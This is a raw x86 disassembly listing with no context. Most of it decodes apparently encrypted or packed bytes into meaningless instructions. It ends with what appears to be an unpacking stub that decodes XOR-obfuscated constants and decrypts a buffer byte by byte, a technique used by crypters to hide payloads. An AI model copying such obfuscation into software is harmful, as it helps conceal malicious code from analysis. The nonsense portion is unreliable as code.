  405914:	int3   
  405915:	and    eax,0x16838676
  40591a:	jnp    0x4058f3
  40591c:	retf   
  40591d:	and    esi,DWORD PTR [esi+0x44]
  405920:	sti    
  405921:	ja     0x405935
  405923:	out    0xc7,eax
  405925:	retf   0x9f12
  405928:	push   ecx
  405929:	pusha  
  40592a:	lods   al,BYTE PTR ds:[esi]
  40592b:	jb     0x405983
  40592d:	mov    edi,0x8cf94019
  405932:	sub    edi,ebp
  405934:	punpckldq mm7,DWORD PTR [eax]
  405937:	in     al,dx
  405938:	push   es
  405939:	loope  0x40590e
  40593b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40593c:	add    BYTE PTR [eax+0x7f],ch
  40593f:	ret    
  405940:	ret    0xbea8
  405943:	cmp    edx,DWORD PTR [edi-0x3b]
  405946:	repnz in al,dx
  405948:	push   0x586ffd60
  40594d:	retf   0x8829
  405950:	imul   edx,DWORD PTR [ebp-0x66741c54],0x5d
  405957:	and    BYTE PTR [eax+0x65],cl
  40595a:	push   0x54801739
  40595f:	mov    ds:0x2db1607a,al
  405964:	mov    edi,0xd0fdde2e
  405969:	sub    BYTE PTR [edi+0x76b163e0],ah
  40596f:	jp     0x405969
  405971:	sbb    ebx,DWORD PTR [ebx+0x41]
  405974:	out    dx,al
  405975:	mov    eax,ds:0x6947bb7f
  40597a:	out    dx,al
  40597b:	mov    edx,0xfffc54ea
  405980:	jmp    0x4be2:0xab3e5519
  405987:	adc    al,0xf4
  405989:	ficomp WORD PTR es:0x4a891535
  405990:	dec    ecx
  405991:	jbe    0x405a10
  405993:	push   es
  405994:	jge    0x4059f4
  405996:	push   esi
  405997:	stos   DWORD PTR es:[edi],eax
  405998:	dec    DWORD PTR [esi-0x3faa1323]
  40599e:	idiv   BYTE PTR [edx]
  4059a0:	popf   
  4059a1:	pop    ebp
  4059a2:	add    edx,ecx
  4059a4:	sub    eax,0x8ba694f1
  4059a9:	mov    ebp,0x4b2b0ea1
  4059ae:	pop    esp
  4059af:	scas   eax,DWORD PTR es:[edi]
  4059b0:	or     edx,DWORD PTR [edx+0x30]
  4059b3:	fst    DWORD PTR [ecx]
  4059b5:	sahf   
  4059b6:	mov    ebx,0xc79017c8
  4059bb:	dec    edi
  4059bc:	pop    edi
  4059bd:	push   0x637eadd1
  4059c2:	ins    BYTE PTR es:[edi],dx
  4059c3:	xchg   ebp,eax
  4059c4:	ja     0x405a00
  4059c6:	(bad)  
  4059c7:	mov    ch,0xad
  4059ca:	aaa    
  4059cb:	jne    0x405a3b
  4059cd:	fwait
  4059ce:	into   
  4059cf:	das    
  4059d0:	pop    ebx
  4059d1:	mov    BYTE PTR [eax],0x8a
  4059d4:	adc    DWORD PTR [ebx+0x6fa6dd96],edx
  4059da:	add    ecx,esi
  4059dc:	adc    cl,BYTE PTR [edx]
  4059de:	(bad)  
  4059df:	sub    DWORD PTR [edi-0x197a5f88],ebp
  4059e5:	cmp    DWORD PTR [edx+0x165f233a],0x44
  4059ec:	dec    esp
  4059ed:	pop    es
  4059ee:	imul   BYTE PTR [ecx]
  4059f0:	test   al,0x4d
  4059f2:	repnz dec ebx
  4059f4:	jle    0x4059b4
  4059f6:	pop    es
  4059f7:	xchg   ebp,eax
  4059f8:	(bad)  
  4059f9:	aad    0x89
  4059fb:	ret    
  4059fc:	jns    0x405a20
  4059fe:	mov    BYTE PTR [ebx],dl
  405a00:	and    BYTE PTR [bp+0x5a],bl
  405a04:	sbb    eax,0x558a8d18
  405a09:	(bad)
  405a0e:	adc    al,0xa5
  405a10:	and    ch,BYTE PTR [esi+0xb]
  405a13:	dec    esp
  405a14:	mov    WORD PTR [edi-0x4e4b8248],gs
  405a1a:	les    esp,FWORD PTR [edx-0x67af54ba]
  405a20:	mov    cl,0x2b
  405a22:	and    eax,DWORD PTR [ecx]
  405a24:	and    al,0x9d
  405a26:	adc    edx,DWORD PTR [eax-0x1f]
  405a29:	out    dx,al
  405a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a2b:	fwait
  405a2c:	shl    DWORD PTR [esi-0x6a141cb],cl
  405a32:	jne    0x405a8d
  405a34:	fabs   
  405a36:	mov    al,ds:0x88184bef
  405a3b:	xor    al,0x27
  405a3d:	xor    al,0x30
  405a3f:	icebp  
  405a40:	and    al,0x98
  405a42:	mov    ds:0xb9d1eb54,al
  405a47:	jmp    0x405a67
  405a49:	mov    WORD PTR [ebx+edx*4-0x5d],ss
  405a4d:	adc    eax,0xd3110708
  405a52:	sbb    eax,0x6e4d5118
  405a57:	inc    edx
  405a58:	vprotw ymm4,xmm7,0xa3
  405a5d:	call   0xdadc743
  405a62:	(bad)  
  405a63:	cmp    bl,BYTE PTR [esi-0x2daa27ed]
  405a69:	jbe    0x405a7c
  405a6b:	pop    eax
  405a6c:	es ja  0x405ad2
  405a6f:	pop    ecx
  405a70:	stos   DWORD PTR es:[edi],eax
  405a71:	sahf   
  405a72:	fnstsw WORD PTR [esi]
  405a74:	add    DWORD PTR [ebx+0x1f],esp
  405a77:	into   
  405a78:	adc    dh,BYTE PTR [eax]
  405a7a:	fwait
  405a7b:	xor    al,ah
  405a7d:	mov    DWORD PTR [eax+0x23],esi
  405a80:	and    DWORD PTR ds:0xeb3c9016,eax
  405a86:	(bad)  
  405a87:	mov    dh,0xd8
  405a89:	retf   0xe04a
  405a8c:	jno    0x405a9c
  405a8e:	aaa    
  405a8f:	sti    
  405a90:	push   esi
  405a91:	mov    esp,0x556139ae
  405a96:	ficomp WORD PTR [edx+0x6178e0d2]
  405a9c:	inc    ecx
  405a9d:	lea    eax,[ecx-0x1915435d]
  405aa3:	adc    BYTE PTR [edi-0x4f],dh
  405aa6:	aad    0x1c
  405aa8:	loop   0x405a40
  405aaa:	mov    cl,BYTE PTR [eax-0x6c]
  405aad:	icebp  
  405aae:	out    dx,eax
  405aaf:	stc    
  405ab0:	mov    ah,0xb5
  405ab2:	xchg   ecx,eax
  405ab3:	sbb    DWORD PTR [edi-0x3f88341d],0xd7e8e6d
  405abd:	repz inc eax
  405abf:	fnstenv [esi-0x21]
  405ac2:	mov    ds:0xfee1f5f2,eax
  405ac7:	xchg   ebp,eax
  405ac8:	int    0x16
  405aca:	adc    eax,0x97faa9b8
  405acf:	call   0xbcc4143d
  405ad4:	push   0xffffffa7
  405ad6:	loopne 0x405a8b
  405ad8:	jecxz  0x405b4d
  405ada:	repz aam 0x7b
  405add:	or     bl,BYTE PTR [edx-0x51]
  405ae0:	fdivr  st(1),st
  405ae2:	ins    BYTE PTR es:[edi],dx
  405ae3:	fdivr  DWORD PTR [edi-0x6b34b07e]
  405ae9:	push   es
  405aea:	gs dec esi
  405aec:	inc    esi
  405aed:	or     ebp,DWORD PTR [ebp-0x33ad5eb7]
  405af3:	jl     0x405ad0
  405af5:	fwait
  405af6:	sub    DWORD PTR [esi+0x4c],ebp
  405af9:	icebp  
  405afa:	fsubr  QWORD PTR [ebx-0x3cb4a0fc]
  405b00:	sub    DWORD PTR [edx+0x5f],ecx
  405b03:	xchg   bl,bl
  405b05:	lods   eax,DWORD PTR ds:[esi]
  405b06:	push   cs
  405b07:	jge    0x405afd
  405b09:	loopne 0x405b1f
  405b0b:	sar    BYTE PTR [edi+0x30],cl
  405b0e:	ins    BYTE PTR es:[edi],dx
  405b0f:	nop
  405b10:	mov    esi,0xa5179d88
  405b15:	je     0x405b26
  405b17:	push   edx
  405b18:	push   cs
  405b19:	imul   eax,DWORD PTR [ebx+0x620e6a96],0x38
  405b20:	ja     0x405b1f
  405b22:	xor    DWORD PTR [edi-0x46b72466],0x3
  405b29:	cwde   
  405b2a:	mov    ecx,0x4a5cd32
  405b2f:	pop    edi
  405b30:	jb     0x405b20
  405b32:	nop
  405b33:	sahf   
  405b34:	ja     0x405b48
  405b36:	jecxz  0x405ad2
  405b38:	sub    cl,ch
  405b3a:	mov    ds:0x11eba9bb,al
  405b3f:	sub    eax,esp
  405b41:	xchg   esi,eax
  405b42:	sti    
  405b43:	xchg   esp,eax
  405b44:	add    al,0xdc
  405b46:	leave  
  405b47:	sbb    al,0x6e
  405b49:	rcr    BYTE PTR [ecx],cl
  405b4b:	div    DWORD PTR [ecx-0x74]
  405b4e:	cmp    BYTE PTR [eax-0x1e],al
  405b51:	cwde   
  405b52:	mov    cl,0x7e
  405b54:	(bad)  
  405b55:	jnp    0x405b16
  405b57:	inc    edi
  405b58:	fcom   DWORD PTR [ebx]
  405b5a:	lds    edi,FWORD PTR es:[ecx]
  405b5d:	mov    edx,0x8fb00e30
  405b62:	mov    eax,0x2e6a937a
  405b67:	jl     0x405b3d
  405b69:	es (bad) 
  405b6b:	int3   
  405b6c:	dec    eax
  405b6d:	stos   DWORD PTR es:[edi],eax
  405b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b6f:	jae    0x405bcc
  405b71:	add    BYTE PTR [edi+0x3a],dl
  405b74:	cli    
  405b75:	ja     0x405b5b
  405b77:	ficom  DWORD PTR ds:0x9b747c9b
  405b7d:	stc    
  405b7e:	loopne 0x405b63
  405b80:	jmp    0xc0e0:0x33574ea4
  405b87:	aad    0xca
  405b89:	sbb    eax,0xc2256ef
  405b8e:	std    
  405b8f:	pop    ebx
  405b90:	pop    eax
  405b91:	sub    DWORD PTR [esi],0xde157a9
  405b97:	push   esp
  405b98:	ja     0x405b29
  405b9a:	enter  0xfaee,0xcd
  405b9e:	leave  
  405b9f:	push   edx
  405ba0:	ffreep st(1)
  405ba2:	call   0x493c2d82
  405ba7:	or     al,0x21
  405ba9:	xchg   esp,eax
  405baa:	cmp    ecx,ebx
  405bac:	push   ecx
  405bad:	test   DWORD PTR [ecx+0xe],esp
  405bb0:	in     al,dx
  405bb1:	cmp    DWORD PTR [ebx],ecx
  405bb3:	sub    al,0x2
  405bb5:	mov    dl,0x48
  405bb7:	cmp    al,0xd5
  405bb9:	scas   al,BYTE PTR es:[edi]
  405bba:	push   edi
  405bbb:	lahf   
  405bbc:	out    dx,eax
  405bbd:	aaa    
  405bbe:	pop    ebp
  405bbf:	mov    ds:0x38360a89,al
  405bc4:	sub    eax,0x5cde9fcf
  405bc9:	out    dx,eax
  405bca:	je     0x405b97
  405bcc:	aas    
  405bcd:	jecxz  0x405c1b
  405bcf:	xor    eax,0x4e72e0d9
  405bd4:	inc    edx
  405bd5:	jge    0x405c1e
  405bd7:	cmp    DWORD PTR [ebx-0x30],edi
  405bda:	xor    eax,DWORD PTR [ecx+0x70]
  405bdd:	sub    BYTE PTR [esi-0x21],0xe1
  405be1:	or     edi,edx
  405be3:	ins    DWORD PTR es:[edi],dx
  405be4:	fs arpl cx,ax
  405be7:	xor    al,dh
  405be9:	mov    bl,0x66
  405beb:	xlat   BYTE PTR ds:[ebx]
  405bec:	pop    esi
  405bed:	or     esp,esi
  405bef:	mov    al,0xc5
  405bf1:	dec    ecx
  405bf2:	ret    0x4dff
  405bf5:	xchg   edi,eax
  405bf6:	xchg   esp,eax
  405bf7:	sub    ah,BYTE PTR [edi]
  405bf9:	out    dx,eax
  405bfa:	push   ebp
  405bfb:	daa    
  405bfc:	inc    ebp
  405bfd:	sbb    DWORD PTR [eax-0x11],esp
  405c00:	das    
  405c01:	jb     0x405bac
  405c03:	and    eax,0x586c9a80
  405c08:	push   edi
  405c09:	out    0x24,eax
  405c0b:	sub    bh,BYTE PTR [esi]
  405c0d:	xlat   BYTE PTR ds:[ebx]
  405c0e:	int3   
  405c0f:	add    BYTE PTR [ebp+0x34df0d9f],ah
  405c15:	fst    DWORD PTR [eax]
  405c18:	cmp    bh,BYTE PTR [ebp-0x262b67e7]
  405c1e:	lds    esi,FWORD PTR [ebx-0x1366b740]
  405c24:	cmp    cl,BYTE PTR [esi+0x17]
  405c27:	inc    eax
  405c28:	out    dx,eax
  405c29:	cmc    
  405c2a:	mov    WORD PTR [edi+0x5a],cs
  405c2d:	jae    0x405c1b
  405c2f:	(bad)  
  405c30:	push   0xffffffed
  405c32:	jnp    0x405bdb
  405c34:	dec    ebp
  405c35:	xchg   ecx,eax
  405c36:	ret    
  405c37:	ins    DWORD PTR es:[edi],dx
  405c38:	inc    edi
  405c39:	jno    0x405c92
  405c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c3c:	hlt    
  405c3d:	xor    ch,BYTE PTR [edx+0x65d41505]
  405c43:	in     eax,0xc5
  405c45:	xor    DWORD PTR [esi-0x2e4be7e2],ecx
  405c4b:	fmul   QWORD PTR [esi+0x20]
  405c4e:	dec    ebp
  405c4f:	test   al,0x1
  405c51:	xchg   BYTE PTR [edi+eax*4-0x2],al
  405c55:	les    eax,FWORD PTR [ebx]
  405c57:	xchg   ebp,eax
  405c58:	mov    WORD PTR [eax+0x13],?
  405c5b:	cmp    al,0xa3
  405c5d:	lods   al,BYTE PTR ds:[esi]
  405c5e:	sub    al,al
  405c60:	ror    BYTE PTR [ecx+edx*1+0x78],0x77
  405c65:	jb     0x405c4e
  405c67:	in     al,0x64
  405c69:	adc    BYTE PTR [ecx-0x20],cl
  405c6c:	or     BYTE PTR [ebx-0x70],ah
  405c6f:	loopne 0x405caf
  405c71:	jmp    0x405c65
  405c73:	mov    esp,0x6fa725e8
  405c78:	push   eax
  405c79:	xchg   edx,eax
  405c7a:	call   0xe1f:0x1440762
  405c81:	jo     0x405c1a
  405c83:	jp     0x405ca8
  405c85:	jo     0x405cd0
  405c87:	mov    bh,0x45
  405c89:	inc    ebx
  405c8a:	outs   dx,BYTE PTR ds:[esi]
  405c8b:	out    0xe9,al
  405c8d:	adc    eax,0x2292fec5
  405c92:	fmul   QWORD PTR [esi-0x758e179a]
  405c98:	adc    DWORD PTR [esi+0x52ab6b3b],esp
  405c9e:	cmc    
  405c9f:	xor    BYTE PTR [ecx],ch
  405ca1:	stos   BYTE PTR es:[edi],al
  405ca2:	add    eax,0x2ba287e
  405ca7:	or     bh,al
  405ca9:	fmul   st(2),st
  405cab:	aam    0x12
  405cad:	or     eax,0x1ea5bf10
  405cb2:	aas    
  405cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cb4:	add    esi,DWORD PTR [edi+0x3638f854]
  405cba:	cmp    esi,DWORD PTR [esi+edx*8+0x1e80a87]
  405cc1:	outs   dx,BYTE PTR ds:[esi]
  405cc2:	lods   eax,DWORD PTR ds:[esi]
  405cc3:	xchg   esp,eax
  405cc4:	mov    cl,0x8f
  405cc6:	xchg   esp,eax
  405cc7:	test   al,0x8b
  405cc9:	mov    ebx,0x620692d8
  405cce:	call   0xa88f:0x7b011491
  405cd5:	int    0x5b
  405cd7:	cmp    al,0x66
  405cd9:	inc    ebx
  405cda:	mov    BYTE PTR [edx],ch
  405cdc:	mov    dh,0x6d
  405cde:	mov    es,WORD PTR [ebp-0x3ee065]
  405ce4:	test   al,0xfb
  405ce6:	jbe    0x405d23
  405ce8:	mov    ax,0xbd25
  405cec:	repz test al,0x4d
  405cef:	fadd   DWORD PTR [esi]
  405cf1:	(bad)  
  405cf3:	std    
  405cf4:	jnp    0x405c80
  405cf6:	adc    eax,0xb1ca986f
  405cfb:	in     eax,dx
  405cfc:	loop   0x405cec
  405cfe:	repnz mov dh,0x56
  405d01:	xor    BYTE PTR [ebp-0x71],bl
  405d04:	ja     0x405cbc
  405d06:	(bad)  
  405d07:	div    DWORD PTR [ecx-0x7c]
  405d0a:	sub    bh,BYTE PTR [ebx-0x6f961d92]
  405d10:	push   ds
  405d11:	push   0xf521d25b
  405d16:	push   edi
  405d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d18:	loop   0x405cc3
  405d1a:	stc    
  405d1b:	add    DWORD PTR [ecx+edx*2+0x38],esi
  405d1f:	not    BYTE PTR [ecx+0x732d9577]
  405d25:	out    dx,eax
  405d26:	push   0x51
  405d28:	jb     0x405cb1
  405d2a:	push   edi
  405d2b:	mov    DWORD PTR [edx+0x1aa0060e],0xdf3a973a
  405d35:	or     BYTE PTR [esi-0x12],dl
  405d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d39:	in     al,dx
  405d3a:	jle    0x405d31
  405d3c:	(bad)  
  405d3e:	fadd   st(5),st
  405d40:	sbb    al,0x40
  405d42:	jne    0x405cf7
  405d44:	sbb    ah,bl
  405d46:	add    dh,BYTE PTR [edi]
  405d48:	xor    BYTE PTR [esi-0x67bd3b13],al
  405d4e:	js     0x405d5d
  405d50:	pushf  
  405d51:	adc    esi,DWORD PTR [esi+0x62ffce18]
  405d57:	(bad)  
  405d58:	pop    edi
  405d59:	or     al,0xd0
  405d5b:	mov    dl,0x1f
  405d5d:	xchg   edi,eax
  405d5e:	jecxz  0x405d10
  405d60:	dec    ecx
  405d61:	pop    esi
  405d62:	jo     0x405d30
  405d64:	jb     0x405da5
  405d66:	loop   0x405d38
  405d68:	xchg   ebx,eax
  405d69:	imul   DWORD PTR [ebx+0x54]
  405d6c:	xchg   edi,eax
  405d6d:	out    dx,eax
  405d6e:	jo     0x405d4a
  405d70:	push   ds
  405d71:	mov    BYTE PTR [edx-0x37],cl
  405d74:	mov    ah,0x33
  405d76:	jle    0x405d89
  405d78:	xor    al,0xab
  405d7a:	add    BYTE PTR [edi-0x63],cl
  405d7d:	push   ebp
  405d7e:	call   0x61c2cde4
  405d83:	test   al,0x2c
  405d85:	mov    eax,ds:0x7d61b4d5
  405d8a:	int    0xc7
  405d8c:	cmp    DWORD PTR [edi+0x295578c8],0x23857515
  405d96:	and    al,0xf4
  405d98:	add    BYTE PTR [eax-0x201a0ad0],0x1
  405d9f:	and    BYTE PTR [edx+0x31a3c414],ah
  405da5:	outs   dx,DWORD PTR ds:[esi]
  405da6:	mov    ch,0xe0
  405da8:	and    ecx,DWORD PTR ds:0x8591195
  405dae:	push   es
  405daf:	das    
  405db0:	repz stc 
  405db2:	xor    eax,0xfd862c2c
  405db7:	sub    BYTE PTR [ebp-0x18],ch
  405dba:	sbb    DWORD PTR [ebp-0x27],eax
  405dbd:	pop    ebp
  405dbe:	inc    edx
  405dbf:	int3   
  405dc0:	xchg   ebx,eax
  405dc1:	js     0x405dd1
  405dc3:	(bad)  
  405dc4:	stos   BYTE PTR es:[edi],al
  405dc5:	loope  0x405d65
  405dc7:	mov    ebx,0x6e27a9d8
  405dcc:	xor    edx,DWORD PTR [ebx+0x53c74a94]
  405dd2:	imul   BYTE PTR [edx-0x1a]
  405dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dd6:	in     al,dx
  405dd7:	jns    0x405db8
  405dd9:	neg    edx
  405ddb:	fiadd  DWORD PTR [eax-0xff5e5a0]
  405de1:	fwait
  405de2:	xchg   esp,eax
  405de3:	pop    ds
  405de4:	ja     0x405df9
  405de6:	adc    DWORD PTR [ecx+ebp*2+0x460906f6],ebx
  405ded:	push   ebp
  405dee:	and    edx,esp
  405df0:	inc    ecx
  405df1:	scas   al,BYTE PTR es:[edi]
  405df2:	jbe    0x405dd8
  405df4:	push   ebp
  405df5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405df6:	nop
  405df7:	hlt    
  405df8:	and    BYTE PTR [edx-0x28],al
  405dfb:	mov    esp,0x337d36bb
  405e00:	out    dx,eax
  405e01:	jecxz  0x405e6d
  405e03:	in     al,dx
  405e04:	dec    esi
  405e05:	repz sub edi,ebp
  405e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e09:	into   
  405e0a:	push   ebx
  405e0b:	sub    BYTE PTR [esi+0x59],0x94
  405e0f:	push   ss
  405e10:	cdq    
  405e11:	pop    esi
  405e12:	adc    ebx,DWORD PTR [ecx]
  405e14:	pop    edx
  405e15:	add    ch,BYTE PTR [ecx]
  405e17:	mov    al,ds:0x53a6acb7
  405e1c:	sar    bl,cl
  405e1e:	pop    ss
  405e1f:	xchg   edx,eax
  405e20:	mov    dh,0x89
  405e22:	pop    es
  405e23:	mov    al,ds:0x69e483de
  405e28:	outs   dx,BYTE PTR ds:[esi]
  405e29:	push   esp
  405e2a:	div    DWORD PTR [esi+0x7a]
  405e2d:	inc    ecx
  405e2e:	int    0x11
  405e30:	aam    0x1
  405e32:	jmp    0x173c72a4
  405e37:	mov    ds:0x516c37db,al
  405e3c:	jne    0x405e0d
  405e3e:	aaa    
  405e3f:	jbe    0x405e0f
  405e41:	js     0x405eaf
  405e43:	sbb    ebx,DWORD PTR [ebp-0x4e4ac962]
  405e49:	and    ecx,DWORD PTR [ecx]
  405e4b:	das    
  405e4c:	dec    ebp
  405e4d:	or     eax,0x4e73d777
  405e52:	fidivr WORD PTR [eax+ebx*2-0x1b4688f2]
  405e59:	sbb    eax,DWORD PTR [edx-0x22]
  405e5c:	rcr    bl,1
  405e5e:	mov    eax,0x7e39228d
  405e63:	sub    BYTE PTR [ebx-0x2cfe858c],bl
  405e69:	sub    ch,BYTE PTR [ebx-0x537433f]
  405e6f:	add    DWORD PTR [ecx+0x5b],edx
  405e72:	fst    DWORD PTR [ebp+0x52]
  405e75:	adc    al,0x3c
  405e77:	xchg   edx,eax
  405e78:	dec    ecx
  405e79:	mov    WORD PTR [ecx+esi*2-0xd2b17fd],?
  405e80:	enter  0xbed5,0xb9
  405e84:	pop    ss
  405e85:	shl    BYTE PTR [edi+0x64],cl
  405e88:	pop    esi
  405e89:	sti    
  405e8a:	push   edi
  405e8b:	repz pop es
  405e8d:	and    DWORD PTR [esi],esp
  405e8f:	out    0xad,al
  405e91:	sti    
  405e92:	sub    bl,ah
  405e94:	adc    eax,0x51e8ff09
  405e99:	ss push eax
  405e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e9c:	fwait
  405e9d:	xchg   esp,eax
  405e9e:	mov    DWORD PTR [ecx],edx
  405ea0:	pushf  
  405ea1:	arpl   WORD PTR [eax-0x23c9fc76],ax
  405ea7:	fwait
  405ea8:	cmp    eax,0xd236ffb0
  405ead:	cmp    BYTE PTR [edi-0xde0ac61],ch
  405eb3:	daa    
  405eb4:	mov    cl,BYTE PTR [esi]
  405eb6:	dec    ecx
  405eb7:	xor    al,0x7f
  405eb9:	inc    ebx
  405eba:	xlat   BYTE PTR ds:[ebx]
  405ebb:	int3   
  405ebc:	and    DWORD PTR [edx+0x23447a78],0xef57e272
  405ec6:	pop    esi
  405ec7:	fild   WORD PTR [edi]
  405ec9:	rcr    BYTE PTR [esi],cl
  405ecb:	mov    edi,ebp
  405ecd:	and    edi,ebp
  405ecf:	lock mov BYTE PTR [edx],dh
  405ed2:	call   DWORD PTR [edx+0x2e392f78]
  405ed8:	cld    
  405ed9:	and    bh,bh
  405edb:	xchg   ebp,eax
  405edc:	ror    BYTE PTR [eax-0x74],1
  405edf:	inc    ebp
  405ee0:	mov    cs,WORD PTR [edx]
  405ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ee3:	sbb    bl,0xd6
  405ee6:	mov    ebx,0x739394c5
  405eeb:	push   edi
  405eec:	ds xchg esp,eax
  405eee:	adc    al,0x5a
  405ef0:	bound  edx,QWORD PTR [ebp+0x626a862b]
  405ef6:	mov    ebx,0xf5a6f628
  405efb:	std    
  405efc:	(bad)  
  405efd:	in     eax,0xab
  405eff:	add    al,0x5f
  405f01:	outs   dx,DWORD PTR ds:[esi]
  405f02:	loope  0x405f31
  405f04:	and    eax,0xd0791adc
  405f09:	xchg   esi,eax
  405f0a:	add    eax,0xf3d01410
  405f0f:	call   0xf438c65
  405f14:	xchg   esi,eax
  405f15:	xchg   edx,eax
  405f16:	stc    
  405f17:	call   DWORD PTR [edx+0x12]
  405f1a:	jns    0x405f20
  405f1c:	loop   0x405ef9
  405f1e:	in     al,dx
  405f1f:	xchg   ebp,eax
  405f20:	outs   dx,DWORD PTR ds:[esi]
  405f21:	sbb    al,0x14
  405f23:	and    dh,BYTE PTR [edx-0x3e]
  405f26:	es and eax,0x8583649e
  405f2c:	add    al,0x35
  405f2e:	fld    DWORD PTR [ecx]
  405f30:	xor    cl,BYTE PTR [ecx+eiz*2]
  405f33:	mov    edx,0x8ad0a603
  405f38:	and    BYTE PTR [ecx+0x4],cl
  405f3b:	inc    esp
  405f3c:	loop   0x405f73
  405f3e:	rcl    WORD PTR [ebx-0x67],cl
  405f42:	dec    esp
  405f43:	lea    ebx,[ecx+0x458901dd]
  405f49:	aam    0x8b
  405f4b:	inc    ebp
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
